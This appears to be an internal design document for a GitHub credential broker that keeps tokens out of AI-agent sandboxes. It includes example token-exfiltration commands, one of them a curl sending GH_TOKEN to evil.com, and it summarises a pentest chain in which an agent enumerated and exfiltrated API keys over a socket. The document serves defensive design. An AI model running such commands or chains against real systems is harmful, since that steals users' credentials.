# GitHub host-broker for sandboxes — design

Covers **#1663** (gh in sandboxes without sharing the PAT) and **#135**
(`@issue-1234` references + structured issue/PR/review retrieval).

Filed 7 months apart, look unrelated, want the same backend.

> **Status:** decisions settled. Ships as **one PR** including the protocol
> change. Revised after design review + verification against the shipped
> sandbox hardening (#1954 → #2467 → #2784).

---

## 0. Threat model — what we are and are not defending against

**In scope: credential theft and leakage.** A prompt-injected agent, or a model
"helpfully" doing something stupid, must not be able to steal a PAT/OAuth token
or leak one to the internet.

**Out of scope: misuse of capabilities we granted.** If we give the agent the
ability to comment on issues, it can file spam. That is an accepted consequence
of granting the capability, not a hole. We are not trying to stop it.

A hostile abliterated model is used as a *pentest tool* against this boundary,
but the boundary itself exists for prompt injection and over-eager agents.

**Consequence:** writes need no gating beyond the normal tool-confirmation path.
Hardening them further would defend against something explicitly out of scope.

---

## 1. The one principle

> **The credential never enters the sandbox. The agent's reach is exactly the
> set of operations the host is willing to perform on its behalf.**

A *capability* boundary, not a filter.

### What this kills

CodeRabbit's plan on #1663 — inject `GH_TOKEN` into the shell env, scrub it from
stdout — is **not** being built. Scrubbing doesn't close it:

```sh
echo ${GH_TOKEN:0:20}; echo ${GH_TOKEN:20}   # neither half matches
echo $GH_TOKEN | base64                      # or | rev, | md5
curl -H "Authorization: bearer $GH_TOKEN" evil.com   # never touches stdout
```

Network is `'on'` in the default profile (`sandboxProfiles.ts:60`).
`shellEnvSecrets` is **dropped.**

---

## 2. The shape

```
┌─ SANDBOX (no credential exists here) ──────────────┐
│  agent → github({op:"issue.view", number:1663})     │
│                      │ typed op + args              │
│                      │ (never a shell string)       │
└──────────────────────┼──────────────────────────────┘
                       │  EXISTING authenticated socket
                       │  (capability token, framed) — multiplexed
┌─ HOST ───────────────┼──────────────────────────────┐
│                      ▼                              │
│         GitHub broker (new component, same socket)  │
│         (validate op, audit, confirm writes)        │
│                      ▼                              │
│                  gh CLI  ──reads its own keyring──▶ │
│                      ▼                              │
│              shape the response                     │
└──────────────────────┼──────────────────────────────┘
                       ▼          shaped result
```

The sandbox sends **arguments**, never a command line. Nothing to
quote-escape, no allowlist, no argv parser to bypass.

### 2.1 The property is credential absence, not `gh` absence

`gh` **is** installed in the sandbox image (`Dockerfile:19`, next to `jq`). It
is simply unauthenticated.

More importantly: users can supply their own image and sandbox profile, so we
**cannot** rely on `gh` being absent — someone may bring an image where it is
pre-authed. The security property must therefore be *"no credential in the
container,"* which is what this design rests on. The binary's presence is
irrelevant to containment.

Unauthenticated `gh api` still reads public repos at 60 req/hr. That is public
data and the agent already has `curl`, so removing the binary would buy no
containment. **This PR does not modify the image.** Removal is tracked as
**#2903**, sequenced after this lands so nothing regresses before the
replacement exists.

We add a *hint* on auth failure so the model doesn't burn turns on
`gh auth login`. An error message, not a broker.

Outside the sandbox, plain `gh` in the shell works exactly as today.

---

## 3. Tool surface

**One tool, op union, named after `gh` subcommands.** Op names are `gh`
subcommands; params are `gh` long flags with dashes dropped (`--repo`→`repo`,
`--limit`→`limit`, `--state`→`state`). Mechanical translation from what every
model already knows. No `--json`/`--jq` — output is pre-shaped.

```js
github({ op: "issue.view", number: 1663, comments: true })
github({ op: "issue.view", number: 42, repo: "acoliver/otherproject" })
github({ op: "issue.edit", number: 1663, addLabel: ["security"], type: "Feature" })
github({ op: "pr.checks",  number: 2317, watch: true })
github({ op: "pr.reviews", number: 2317, actionable: true })
github({ op: "pr.comment", number: 2317, body: "..." })
github({ op: "pr.resolve-thread", threadId: "PRRT_..." })
```

**`repo: "owner/name"` on every op**, defaulting to the current repo. Mirrors
`gh --repo`. Cross-repo is a first-class requirement — bugs are cross-project.
Works for public repos, private repos on free plans, and any account. Nothing
here is Enterprise-specific; GHES becomes an optional `host` param later.

Models don't one-shot unfamiliar tools, so the tool description carries several
worked examples **and the exact response shape**, removing the guesswork that
`--jq` currently absorbs.

`pr.reviews --actionable` has no `gh` equivalent — it drops CodeRabbit's
wall-of-summary and returns actionable items. That's #135's ask, and it is only
possible because we shape.

The tool exists in **both** environments and always routes through the broker,
so the sandboxed path is not a rarely-exercised special case.

---

## 4. Op set (mined from `.github/`, `scripts/`, skills, memory files)

| Reads | | Writes | |
|---|---|---|---|
| `issue.list` | 68 | `issue.create` | 26 |
| `pr.view` | 11 | `issue.comment` | 14 |
| `pr.checks` (+watch) | 5 | `pr.edit` | 12 |
| `issue.view` | 5 | `issue.edit` | 11 |
| `run.list` | 4 | `label.create` | 6 |
| `search.issues` / `search.prs` | 4 | `issue.close` | 2 |
| `pr.list`, `pr.diff`, `label.list` | | `pr.create`, `pr.comment`, `pr.ready` | |

Write-heavy — read-only v1 would not support the actual loop.

### `gh api` retires, with one caveat

Verified against the live schema: `updateIssue` accepts
`labelIds labels state stateInput projectIds issueTypeId issueType
assigneeIds milestoneId title body` in **one mutation**, so `issue.edit`
absorbs type + labels + projects + assignees + state. `resolveReviewThread`
takes only `threadId`.

**Caveat:** `run.download` is binary REST, not GraphQL. **Out of v1** — CI
usage, not agent usage, and binary blobs fight the frame budget.

---

## 5. Credentials — host `gh` auth only

```
✓ Logged in to github.com account acoliver (keyring)
  Token: gho_************   ← OAuth, not a PAT
  Scopes: admin:public_key, gist, project, read:org, repo, workflow
```

The executor runs `gh`; `gh` reads its own keyring credential. llxprt never
touches the token. Zero setup, zero storage, nothing for us to leak.

### 5.1 PAT-via-`/key` is excluded — it would regress #1954

Lineage: **#1954** (abliterated-model pentest) → **#2467** (capability token +
enumeration restrictions) → **#2784** (capability bootstrap boundary).

The pentest chain was: connect → handshake → `list_api_keys` enumerate →
`get_api_key` exfiltrate. The fix closed **steps 1–3**: capability token via
`timingSafeEqual`, `list_api_keys` returns empty to sandbox callers,
`has_api_key` blocked. **Step 4 was deliberately left open:**

```js
// Intentionally allowed for sandbox connections: the sandbox process needs
// API keys by known name to configure provider clients.
private async handleGetApiKey(...) { ... this.sendOk(socket, id, { key }); }
```

**The real boundary is the capability token, not name secrecy.** `get_api_key`
is gated on a shared secret validated with `timingSafeEqual` over a SHA-256
hash. An agent that guesses the socket path, reads the llxprt source, and
speaks perfect protocol still gets `UNAUTHORIZED`. That is Kerckhoffs done
correctly — knowing the design buys nothing. Enumeration restrictions are a
second layer that stops one leak becoming a full inventory.

So the reason to exclude PAT-via-`/key` is **not** guessable names. It is:

> `/key` storage is only as strong as the capability token, and a PAT is a
> **durable, exfiltratable, high-value** credential in a way an ephemeral
> operation is not.

Host `gh` auth is better precisely because there is nothing for the broker to
hand out even if someone gets past the gate. Storing a PAT re-creates the exact
asset #1954 was about stealing.

**Residual risk (tracked separately):** the capability token lives only in the
CLI process's memory, but the container runs without `--cap-drop`, without
`--security-opt no-new-privileges`, without a seccomp profile, and in some
paths as `--user root`, in a shared PID namespace. Whether a shell in the
container can read that memory depends on `ptrace_scope` and capabilities.
Until that is hardened, the honest property is:

> The credential never enters the sandbox **so long as the capability token
> does not leak**, and the token's confidentiality currently rests on
> in-container process isolation that is not hardened.

This broker does not make that worse — it rides the same socket behind the same
gate, and anything able to extract the token can already reach `get_api_key`
today. **Tracked as #2902.**

**⚠️ `admin:public_key` is in scope** — that token can add SSH keys to the
account. The op set is the only boundary, because the credential behind it is
broad.

### 5.2 Constraints inherited from #2784 — do not regress

- The capability token arrives by **trusted fd 3**, is consumed before any user
  code runs, and lives only in a module-private factory cache. Never an env
  var, never a mounted file.
- The broker **reuses that existing cache**. It introduces **no new secret
  transport, no new env var, no new mount, no new listener**.
- Enumeration restrictions (`list_api_keys` empty, `has_api_key` blocked) stay
  exactly as they are.

---

## 6. Protocol — in this PR

Measured constraints in `framing.ts` / `proxy-socket-client.ts`:

| # | Constraint | Value | Consequence |
|---|---|---|---|
| 1 | `MAX_FRAME_SIZE` | 64 KB | issue #1663 itself is 50 KB |
| 2 | `REQUEST_TIMEOUT_MS` | 30 s | blocking watch dies at 30s |
| 3 | `IDLE_TIMEOUT_MS` | 5 min | `gracefulClose()` rejects pending requests |
| 4 | Request map | resolves once | progress frame would be eaten |
| 5 | Cancellation | none | Ctrl+C orphans a host-side poller |

### 6.1 Blocker: per-connection serialization

`shouldContinueProcessing()` chains **every** request on a connection:

```js
// Serialize dispatch per-connection to prevent overlapping socket.write()
// calls when multiple frames arrive in a single TCP chunk.
state.inFlight = (state.inFlight ?? Promise.resolve())
  .then(() => this.dispatchRequest(socket, frame, state))
```

A 15-minute blocking watch blocks **everything behind it — including
`get_api_key`**, which the sandbox needs to configure LLM provider clients. A
blocking watch would stall the agent's own model auth. Deadlock, not slowdown.

Note the invariant the comment actually claims: **write atomicity**, not request
serialization. Serializing whole handlers is a heavier hammer than needed.

**Fix: serialize writes, not handlers** — concurrent dispatch, responses funneled
through a write queue. This is also exactly what "multiplex it, no new listener"
requires.

### 6.2 Scope (one PR)

Frame cap raise · per-op timeout override · cancel op · concurrent dispatch with
serialized writes. Handshake already negotiates `minVersion`/`maxVersion`, so
v1/v2 coexistence is available; the contract gets stated explicitly.

**Deferred:** chunked/streaming responses, progress frames. Shaped payloads are
an order of magnitude smaller than raw JSON.

---

## 7. Decisions

- **One PR**, protocol included.
- **Blocking watch** first; `watch:"detach"` later.
- **Poll: 10s for the first 30s, then 30s steady.** The 300s habit is tuned for
  a blocking shell command you're trying not to babysit; once the host owns the
  poll that constraint is gone. Lint/format fail in the first 30–60s, so
  early-fast catches the common case; 30s steady is ~120 req/hr against a
  5000/hr budget (2.4%) with 30s worst-case staleness.
- **Broker is a separate component, multiplexed on the existing socket.** No new
  port, no new listener.
- **Cross-repo via `repo` on every op.** Not Enterprise-only.
- **Shaped ops, one tool, writes in v1.**
- **Live UI** during blocking watch.

### Defaults I'm planning against (overrule freely)

- **Watch UI:** in-place check list (`✓ lint  ✓ test  ⣾ build`) with elapsed
  time; Ctrl+C cancels the host-side poller. Verified in the tmux harness.
- **Writes:** reads free; writes go through the **existing** tool-confirmation
  path so normal allowlisting and "always allow" apply. No additional gating —
  per §0, misuse of a granted capability (spam issues) is explicitly out of
  scope, so hardening writes further would defend against a non-goal.

---

## 8. Still to resolve during planning

1. **GHES / custom hosts** — optional `host` param; not v1-blocking.
2. **Rate limiting** — poll backoff defined above; still need the 403/429
   surface shape.
3. **Testing** — behavioral, per `dev-docs/RULES.md`. Core property: no op
   response ever carries the raw credential, and #1954's vectors stay closed.
4. **GraphQL error translation** — GraphQL returns HTTP 200 with an `errors`
   array; partial failures and permission errors need structured mapping.
5. **Response-content exfiltration** — shaped responses carry issue bodies, PR
   diffs, logs; with network on, anything returned is exfiltratable. Inherent;
   state it and decide if content filtering is ever in scope.
